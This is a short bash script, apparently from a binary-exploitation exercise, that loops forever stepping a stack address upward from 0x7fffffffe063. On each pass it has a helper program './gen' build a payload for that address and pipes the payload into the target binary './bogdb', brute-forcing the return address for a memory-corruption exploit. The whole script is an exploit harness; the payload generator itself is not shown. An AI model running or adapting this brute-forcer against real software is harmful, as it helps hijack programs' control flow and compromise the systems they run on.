#!/bin/bash

#0x7fffffffe063,
addr=140737488347235

target=./bogdb
while [ 1 ]; do
    param=$(python3 -c 'print(hex('$addr'))')
    param=$(echo $param | cut -d'x' -f2)  
    
    ./gen $param > payload.txt

    $target < payload.txt

    addr=$(python3 -c 'print('$addr' + 1)')
done